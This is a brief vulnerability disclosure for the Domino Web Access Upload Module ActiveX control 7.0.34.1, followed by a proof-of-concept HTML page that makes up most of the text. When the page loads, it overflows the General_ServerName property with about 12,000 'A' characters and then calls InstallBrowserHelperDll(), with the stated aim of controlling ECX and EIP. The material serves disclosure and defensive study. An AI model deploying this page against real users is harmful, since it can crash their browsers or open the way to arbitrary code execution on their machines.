The Domino Web Access Upload Module version 7.0.34.1 seems to suffer from a memory corruption issue that may allow the execution of arbitrary code. By setting the General_ServerName property and calling the InstallBrowserHelperDll() function it MAY be possible to control the ECX register and thereby control the EIP. PoC as follows:

-------------------
<!--

<html>
 <head>
  <script language="JavaScript" DEFER>
   function Check() {
     var s = 'A';

    while (s.length <= 12000) s = s + 'A';

    obj.General_ServerName = s;
    obj.InstallBrowserHelperDll();
  
   }
  </script>

 </head>
 <body onload="JavaScript: return Check();">
<object id="obj" classid="clsid:E008A543-CEFB-4559-912F-C27C2B89F13B" />
</object>
</body>
</html>
